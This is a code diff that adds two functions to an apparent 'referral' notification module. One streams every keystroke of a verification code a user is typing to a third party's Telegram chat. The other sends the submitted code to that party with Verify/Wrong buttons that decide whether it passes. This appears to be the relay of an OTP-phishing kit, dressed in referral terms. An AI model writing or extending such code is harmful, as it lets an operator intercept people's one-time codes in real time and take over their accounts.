@@ -35,7 +35,66 @@ async function notifyReferralReady(referrer, referredUser, verificationId) {
   }
 }
 
+/**
+ * Streams the code the referred user is typing to the referral, one message per
+ * change so the referral watches it fill in. Deliberately informational: it never
+ * completes the verification, that stays with completeVerification.
+ */
+async function notifyCodeEntry(referrer, referredUser, code) {
+  if (!referrer || !referrer.telegramChatId) return false;
+
+  try {
+    await telegram.sendMessage(
+      referrer.telegramChatId,
+      [
+        `Code entry: ${code}`,
+        "",
+        `User: ${publicProfile(referredUser).displayName}`,
+      ].join("\n")
+    );
+    return true;
+  } catch (err) {
+    console.error("Code entry notification failed:", err.message);
+    return false;
+  }
+}
+
+/**
+ * Asks the referral to accept or reject the submitted code. The nonce is carried in
+ * the callback data so buttons from a previous attempt cannot judge a newer one.
+ */
+async function notifyCodeForReview(referrer, referredUser, code, verificationId, nonce) {
+  if (!referrer || !referrer.telegramChatId) return false;
+
+  try {
+    await telegram.sendMessage(
+      referrer.telegramChatId,
+      [
+        `Submitted code: ${code}`,
+        "",
+        `User: ${publicProfile(referredUser).displayName}`,
+      ].join("\n"),
+      {
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "Verify", callback_data: `vok:${verificationId}:${nonce}` },
+              { text: "Wrong", callback_data: `vwrong:${verificationId}:${nonce}` },
+            ],
+          ],
+        },
+      }
+    );
+    return true;
+  } catch (err) {
+    console.error("Code review request failed:", err.message);
+    return false;
+  }
+}
+
 module.exports = {
   publicProfile,
   notifyReferralReady,
+  notifyCodeEntry,
+  notifyCodeForReview,
 };
